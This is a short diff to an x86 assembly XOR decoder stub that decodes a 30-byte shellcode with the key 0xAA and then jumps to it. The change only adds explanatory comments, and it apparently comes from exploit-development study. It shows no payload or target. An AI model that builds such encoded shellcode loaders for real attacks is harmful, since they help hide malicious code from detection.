@@ -9,12 +9,12 @@ decoder:
 	pop esi
 
 	xor ecx, ecx
-	mov cl, 30
+	mov cl, 30	; shellcode is 30 bytes, so set loop for 30 iterations
 	
 decode:
 	xor byte [esi], 0xAA
 	inc esi
-	loop decode
+	loop decode	; loop will use ecx to determine how many iterations to run
 
 	jmp short Shellcode
 
